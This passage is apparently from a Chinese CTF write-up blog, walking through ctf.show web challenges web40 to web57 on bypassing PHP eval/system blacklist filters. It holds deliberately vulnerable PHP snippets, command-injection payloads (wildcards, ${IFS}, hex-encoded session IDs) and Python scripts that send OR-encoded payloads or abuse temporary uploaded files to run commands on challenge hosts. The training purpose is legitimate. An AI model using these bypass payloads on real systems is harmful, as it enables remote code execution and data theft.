\u6570\u6765\u83b7\u53d6\u5176\u503c\uff0c\u8be6\u7ec6\u53ef\u4ee5\u770b\u5b98\u65b9\u51fd\u6570\u3002payload\uff1avar_dump(current(get_defined_vars()));\r\n\r\nsession_id()\uff1asession_id()\u53ef\u4ee5\u7528\u6765\u83b7\u53d6/\u8bbe\u7f6e\u5f53\u524d\u4f1a\u8bdd ID\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u83b7\u53d6cookie\u4e2d\u7684phpsessionid\uff0c\u5e76\u4e14\u8fd9\u4e2a\u503c\u6211\u4eec\u662f\u53ef\u63a7\u7684\u3002\r\n    \u5982\u53ef\u4ee5\u5728cookie\u4e2d\u8bbe\u7f6e PHPSESSID=706870696e666f28293b\uff0c\u7136\u540e\u7528hex2bin()\u51fd\u6570\uff0c\u5373\u4f20\u5165?exp=eval(hex2bin(session_id(session_start())));     \u5e76\u8bbe\u7f6ecookie\uff1aPHPSESSID=706870696e666f28293b\r\n    session_start \u51fd\u6570\u662f\u4e3a\u4e86\u5f00\u542fsession\r\n    \r\n\u914d\u5408\u4f7f\u7528\u7684\u51fd\u6570\uff1a\r\n\tprint_r(scandir(\u2018.\u2019)); \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u540d\r\n    var_dump()\r\n\tlocaleconv() \u51fd\u6570\u8fd4\u56de\u4e00\u5305\u542b\u672c\u5730\u6570\u5b57\u53ca\u8d27\u5e01\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u7ec4\u3002\r\n\tcurrent() \u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u5f53\u524d\u5143\u7d20\uff08\u5355\u5143\uff09,\u9ed8\u8ba4\u53d6\u7b2c\u4e00\u4e2a\u503c\uff0cpos\u662fcurrent\u7684\u522b\u540d\r\n\teach() \u8fd4\u56de\u6570\u7ec4\u4e2d\u5f53\u524d\u7684\u952e/\u503c\u5bf9\u5e76\u5c06\u6570\u7ec4\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u6b65\r\n\tend() \u5c06\u6570\u7ec4\u7684\u5185\u90e8\u6307\u9488\u6307\u5411\u6700\u540e\u4e00\u4e2a\u5355\u5143\r\n\tnext() \u5c06\u6570\u7ec4\u4e2d\u7684\u5185\u90e8\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u4f4d\r\n\tprev() \u5c06\u6570\u7ec4\u4e2d\u7684\u5185\u90e8\u6307\u9488\u5012\u56de\u4e00\u4f4d\r\n\tarray_reverse() \u4ee5\u76f8\u53cd\u7684\u5143\u7d20\u987a\u5e8f\u8fd4\u56de\u6570\u7ec4\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u9996\u5148\u6784\u9020payload\u8f93\u51fa\u5f53\u524d\u6587\u4ef6\u4e0b\u7684\u6587\u4ef6\u540d\uff0c\u56e0\u4e3a\u8fc7\u6ee4\u4e86\u7279\u6b8a\u7b26\u53f7\u6240\u4ee5\u4e0a\u9762print_r(scandir(\u2018.\u2019));\u4e0d\u80fd\u76f4\u63a5\u7528"}),"\n",(0,l.jsx)(n.p,{children:"\u8981\u914d\u5408localeconv()\u548ccurrent()\u6765\u4f7f\u7528"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=print_r(scandir(current(localeconv())));\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211109201053754",src:r(45142).A+"",width:"596",height:"54"})}),"\n",(0,l.jsx)(n.p,{children:"flag.php\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\uff0c\u7136\u540e\u7528show_source\u8f93\u51fa"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=show_source(next(array_reverse(scandir(current(localeconv())))));\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web41",children:"web41"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n    $c = $_POST['c'];\r\nif(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i', $c)){\r\n        eval(\"echo($c);\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\r\n?>\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u9053\u9898\u8fc7\u6ee4\u4e86\u6570\u5b57\u548c\u5b57\u6bcd(\u56e0\u4e3a\u540e\u9762/i\u5bf9\u5927\u5c0f\u5199\u4e0d\u654f\u611f)\uff0c\u5e76\u4e14\u4e0d\u80fd\u7528\u5f02\u6216\u3001\u53d6\u53cd\u3001\u81ea\u589e\u7b49\u64cd\u4f5c\uff08\u8fc7\u6ee4$\u3001+\u3001-\u3001^\u3001~\uff09\uff0c\u4f46\u662f\u53ef\u4ee5\u7528|(\u6216)"}),"\n",(0,l.jsx)(n.p,{children:"\u4ed6\u8fd9\u91cc\u8fc7\u6ee4\u7684\u6570\u5b57\u6307\u7684\u662fascii\u7c7b\u578b\u7684\uff0c\u6240\u4ee5\u5982%09(tab)\u8fd9\u79cd\u662f\u6ca1\u6709\u8fc7\u6ee4\u7684\uff0c\u4e8e\u662f\u53ef\u4ee5\u7528\u6b64\u6765\u6784\u9020\u51fa\u60f3\u7528\u7684\u5b57\u6bcd\u548c\u6570\u5b57\u3002\u8fd9\u91cc\u7ed9\u51fa\u7f51\u4e0a\u6709\u7684\u4e00\u4e2a\u811a\u672c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:'import re\r\nimport requests\r\n\r\nurl="http://64dc8155-8f3b-4e75-a8e5-dbe633352099.challenge.ctf.show/"\r\n\r\na=[]\r\nans1=""\r\nans2=""\r\nfor i in range(0,256):\r\n    c=chr(i)\r\n    tmp = re.match(r\'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-\',c, re.I)\r\n    if(tmp):\r\n        continue\r\n        #print(tmp.group(0))\r\n    else:\r\n        a.append(i)\r\n\r\nmya="system"  #\u51fd\u6570\u540d \u8fd9\u91cc\u4fee\u6539\uff01\r\nmyb="ls"      #\u53c2\u6570\r\ndef myfun(k,my):\r\n    global ans1\r\n    global ans2\r\n    for i in range (0,len(a)):\r\n        for j in range(i,len(a)):\r\n            if(a[i]|a[j]==ord(my[k])):\r\n                ans1+=chr(a[i])\r\n                ans2+=chr(a[j])\r\n                return;\r\nfor k in range(0,len(mya)):\r\n    myfun(k,mya)\r\ndata1="(\\""+ans1+"\\"|\\""+ans2+"\\")"\r\nans1=""\r\nans2=""\r\nfor k in range(0,len(myb)):\r\n    myfun(k,myb)\r\ndata2="(\\""+ans1+"\\"|\\""+ans2+"\\")"\r\n\r\ndata={"c":data1+data2}\r\nr=requests.post(url=url,data=data)\r\nprint(r.text)\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web42",children:"web42"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    system($c.\" >/dev/null 2>&1\");\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u662f$c\u53c2\u6570\u540e\u9762\u63a5\u4e86\u4e2a>/dev/null 2>&1\uff0c\u767e\u5ea6\u4e00\u4e0b"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:"0   \u6807\u51c6\u8f93\u5165\r\n1   \u6807\u51c6\u8f93\u51fa\r\n2   \u9519\u8bef\u8f93\u51fa\r\n\u5728\u7c7bUnix\u7cfb\u7edf\u4e2d,/dev/null,\u6216\u79f0\u7a7a\u8bbe\u5907,\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u8bbe\u5907\u6587\u4ef6,\u5b83\u4e22\u5f03\u4e00\u5207\u5199\u5165\u5176\u4e2d\u7684\u6570\u636e(\u4f46\u62a5\u544a\u5199\u5165\u64cd\u4f5c\u6210\u529f)\r\n\u533a\u522b\uff1a\r\n2>/dev/null   \u628a\u9519\u8bef\u8f93\u51fa\u5230\u7a7a\u8bbe\u5907\uff08\u5373\u4e22\u5f03\uff09\r\n>/dev/null 2>&1   \u76f8\u5f53\u4e8e1>/dev/null 2>&1   \u5373\u628a\u6807\u51c6\u8f93\u51fa\u4e22\u5f03\uff0c\u5e76\u4e14\u628a\u9519\u8bef\u8f93\u51fa\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u3002\u5408\u8ba1\u8d77\u6765\u5c31\u662f\u9519\u8bef\u548c\u6807\u51c6\u8f93\u51fa\u90fd\u8f93\u51fa\u5230\u7a7a\u8bbe\u5907\r\n2>&1 >/dev/null   \u9519\u8bef\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u5373\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a\uff0c\u800c\u6807\u51c6\u8f93\u51fa\u88ab\u4e22\u5f03\r\n\r\n\u91cd\u5b9a\u5411> \u548c >>   \u524d\u8005\u4f1a\u5148\u6e05\u7a7a\u6587\u4ef6\uff0c\u7136\u540e\u518d\u5199\u5165\u5185\u5bb9\uff0c\u540e\u8005\u4f1a\u5c06\u91cd\u5b9a\u5411\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u73b0\u6709\u6587\u4ef6\u7684\u5c3e\u90e8.\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8f93\u5165\u7684\u5185\u5bb9\u4f1a\u88ab\u4e22\u5f03\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u7b54\u6848\u662f\u53ef\u4ee5\u7528;\u6216||\u7b49\u8fdb\u884c\u5206\u5272\uff0c\u5982?c=ls&&pwd. \u6267\u884c\u7684\u65f6\u5019\u4f1a\u5c06ls\u7ed9\u6267\u884c\u800c\u4e22\u5f03pwd\u547d\u4ee4"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac flag.php||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web43",children:"web43"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"\r\nif(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u53ea\u662f\u8fc7\u6ee4\u4e86\u5206\u53f7\u548ccat\u800c\u5df2\uff0c\u7ee7\u7eed\u7528\u4e0a\u9762\u7684"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac flag.php||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web44",children:"web44"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/;|cat|flag/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u57fa\u7840\u4e0a\u8fc7\u6ee4flag\u800c\u5df2\uff0c\u7528\u901a\u914d\u7b26\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac f*||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web45",children:"web45"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| /i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u57fa\u7840\u4e0a\u8fc7\u6ee4\u7a7a\u683c\u800c\u5df2\uff0c\u7528%09\u5373\u53ef"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac%09f*||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web46",children:"web46"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e0a\u8fc7\u6ee4\u4e86\u6570\u5b57 $ *"}),"\n",(0,l.jsx)(n.p,{children:"\u6362\u4e00\u4e0b\u901a\u914d\u7b26\u5373\u53ef"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac%09fla?.???||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web47",children:"web47"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u57fa\u7840\u4e0a\u8fc7\u6ee4\u4e86more less head sort tail,\u8fd8\u662f\u6ca1\u6709\u8fc7\u6ee4tac \u7ee7\u7eed\u7528"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac%09fla?.???||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web48",children:"web48"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd8\u662f\u6ca1\u6709\u8fc7\u6ee4tac"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac%09fla?.???||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web49",children:"web49"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u591a\u8fc7\u6ee4\u4e86\u4e2a\u767e\u5206\u53f7\u800c\u5df2\uff0c\u8fd8\u662f\u6ca1\u5f71\u54cd"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac%09fla?.???||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web50",children:"web50"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u54e6\u8c41\uff0c\u8fc7\u6ee4\u4e86\\x09\u548c\\x26"}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f\u60f3\u5230\u7528<>\uff0c\u4f46\u662f\u53d1\u73b0<>\u548c?\u7ec4\u5408\u7684\u65f6\u5019\u6ca1\u6709\u8f93\u51fa\uff0c\u4e8e\u662f\u5c06\u4e0a\u9762payload\u6539\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=tac<>fl\\ag.php||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web51",children:"web51"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u6b21\u5c45\u7136\u8fc7\u6ee4\u4e86tac\uff0c\u4f46\u662f\u5728web31\u7684\u65f6\u5019\u8bb2\u8fc7\uff0c\u53e6\u5916\u540ccat\u529f\u80fd\u7684\u51fd\u6570\u8fd8\u6709\uff1a\r\ncat\u3001tac\u3001more\u3001less\u3001head\u3001tail\u3001nl\u3001sed\u3001sort\u3001uniq\u3001rev"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=nl<>fl\\ag.php||ls\r\nflag\u5728\u6e90\u4ee3\u7801\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web52",children:"web52"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        system($c.\" >/dev/null 2>&1\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u6b21\u8fc7\u6ee4\u4e86<>\uff0c\u5c0f\u95ee\u9898\u7528${IFS}"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=nl${IFS}fl\\ag.php||ls\r\n\u7136\u540e\u770b\u6e90\u4ee3\u7801\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4f46\u662f\u53d1\u73b0flag\u6539\u4e86\u5730\u65b9"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211110103909684",src:r(4607).A+"",width:"545",height:"391"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f?c=ls${IFS}/||ls\u53d1\u73b0flag\u5728\u6839\u76ee\u5f55\uff0c\u6240\u4ee5\u6700\u7ec8payload\u4e3a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=nl${IFS}/fl\\ag||ls\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web53",children:"web53"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        echo($c);\r\n        $d = system($c);\r\n        echo \"<br>\".$d;\r\n    }else{\r\n        echo 'no';\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"<br> \u662f\u6362\u884c\u7b26"}),"\n",(0,l.jsx)(n.p,{children:"\u5f53\u6211\u8f93\u5165?c=ls\u65f6\uff0c\u8fd4\u56de\u7684\u662f"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"lsflag.php index.php readflag\r\nreadflag\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u6211\u8fd8\u662f\u7528\u7684\u4e0a\u4e0a\u4e00\u4e2apayload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=nl${IFS}fl\\ag.php||ls\r\n\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u6211\u4e5f\u6682\u65f6\u6ca1\u770b\u660e\u767d\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web54",children:"web54"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        system($c);\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\xbf\xbf\xbf\xbf\u4ec0\u4e48\u725b\u9a6c"}),"\n",(0,l.jsx)(n.p,{children:"\u4f46\u662f\u4ed6\u6ca1\u6709\u60f3\u5230\u5427\u8fd8\u80fd\u7528rev\u51fd\u6570"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=rev${IFS}fla?.php\r\n\u5f97\u5230\u7684\u518dreverse\u4e00\u4e0b\u5c31\u662fflag\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web55",children:"web55"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        system($c);\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u628a\u5b57\u6bcd\u8fc7\u6ee4\u4e86\u800c\u5df2\uff0c\u53ef\u4ee5\u7528\u901a\u914d\u7b26\u6765\u628aflag\u641e\u51fa\u6765"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:"bin\u4e3abinary\u7684\u7b80\u5199\uff0c\u4e3b\u8981\u653e\u7f6e\u4e00\u4e9b\u7cfb\u7edf\u7684\u5fc5\u5907\u6267\u884c\u6863\u4f8b\u5982:cat\u3001cp\u3001chmod df\u3001dmesg\u3001gzip\u3001kill\u3001ls\u3001mkdir\u3001more\u3001mount\u3001rm\u3001su\u3001tar\u3001base64\u7b49\u3002\r\n\u6211\u4eec\u65e5\u5e38\u76f4\u63a5\u4f7f\u7528\u7684cat\u6216\u8005ls\u7b49\u7b49\u90fd\u5176\u5b9e\u662f\u7b80\u5199\uff0c\u4f8b\u5982ls\u5b8c\u6574\u5168\u79f0\u5e94\u8be5\u662f/bin/ls\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6240\u4ee5payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=/???/????64 ????.???\r\n\u7136\u540e\u89e3\u7801\u5373\u53ef\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web56",children:"***web56"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        system($c);\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u751a\u81f3\u5427\u6570\u5b57\u90fd\u7ed9\u8fc7\u6ee4\u6389\u4e86\uff0c\u8fd8\u6709\u90e8\u5206\u7684\u7279\u6b8a\u5b57\u7b26"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u770b\u5357\u795e\u535a\u5ba2\uff0c\u5357\u795e\u539f\u8bdd"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-YuanHua",children:"\u201c\u8fd9\u6b21\u5728\u4e0a\u4e00\u9898\u7684\u57fa\u7840\u4e0a\u591a\u8fc7\u6ee4\u6389\u4e86\u6570\u5b57\uff0c\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u4f7f\u7528\u4e0a\u9898\u7684payload\u3002\u4e0d\u8fc7\u4e4b\u524d\u770b\u8fc7p\u5e08\u5085\u7684\u4e00\u7bc7\u65e0\u5b57\u6bcd\u6570\u5b57webshell\u7684\u6587\u7ae0\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528php\u7684\u7279\u6027\uff1a\u5982\u679c\u6211\u4eec\u53d1\u9001\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\u7684post\u5305\uff0cphp\u4f1a\u5c06\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u4fdd\u5b58\u5728\u4e34\u65f6\u7684\u6587\u4ef6\u5939\u4e0b\uff0c\u5e76\u4e14\u9ed8\u8ba4\u7684\u6587\u4ef6\u76ee\u5f55\u662f/tmp/phpxxxxxx\u3002\u6587\u4ef6\u540d\u6700\u540e\u76846\u4e2a\u5b57\u7b26\u662f\u968f\u673a\u7684\u5927\u5c0f\u5199\u5b57\u6bcd\uff0c\u800c\u4e14\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u5927\u6982\u7387\u662f\u5927\u5199\u5b57\u6bcd\u3002\u5bb9\u6613\u60f3\u5230\u7684\u5339\u914d\u65b9\u5f0f\u5c31\u662f\u5229\u7528\uff1f\u8fdb\u884c\u5339\u914d\uff0c\u5373???/?????????\uff0c\u7136\u800c\u8fd9\u4e0d\u4e00\u5b9a\u4f1a\u5339\u914d\u5230\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u201d\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u53d1\u73b0\u53ef\u4ee5\u7528[]\u6765\u6b63\u5219\u5339\u914d\uff0c\u5982???/?????????[A-Z]\u5c31\u80fd\u5339\u914dB-Y\uff0c\u4e8e\u662f\u4e3a\u4e86\u5339\u914dA-Z\u5c31\u53ef\u4ee5\u4ece@\u5339\u914d\u5230["}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u8fd9\u91cc\u6709\u4e2a\u6280\u5de7\u662f\u4f7f\u7528 . \u6765\u6267\u884c\u6587\u4ef6\uff0c\u5982\u521b\u5efa\u4e86\u4e00\u4e2a a.txt\uff0c\u7136\u540e\u91cc\u9762\u5199ls"}),"\n",(0,l.jsx)(n.p,{children:"shell\u91cc\u6267\u884c . a.txt,\u5c31\u4f1a\u6267\u884c\u51fals\u7684\u7ed3\u679c\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f\u6784\u9020\u5982\u4e0b"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:'import requests\r\nwhile True:\r\n    url = \'http://617464c5-1e4b-4cd8-9ef1-adbb89037d3c.challenge.ctf.show/?c=. /???/????????[@-[]\'\r\n    flag = requests.post(url=url,files={"file":("flag.txt","cat flag.php")})\r\n    if("ctf" in flag.text):\r\n        print(flag.text)\r\n        break\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230flag"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211115201016863",src:r(51721).A+"",width:"624",height:"255"})}),"\n",(0,l.jsxs)(n.p,{children:["\u8fd8\u53ef\u4ee5\u770b",(0,l.jsx)(n.a,{href:"https://blog.csdn.net/qq_46091464/article/details/108513145",children:"https://blog.csdn.net/qq_46091464/article/details/108513145"})]}),"\n",(0,l.jsx)(n.h3,{id:"web57",children:"web57"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'//flag in 36.php \r\nif(isset($_GET[\'c\'])){\r\n    $c=$_GET[\'c\'];\r\n    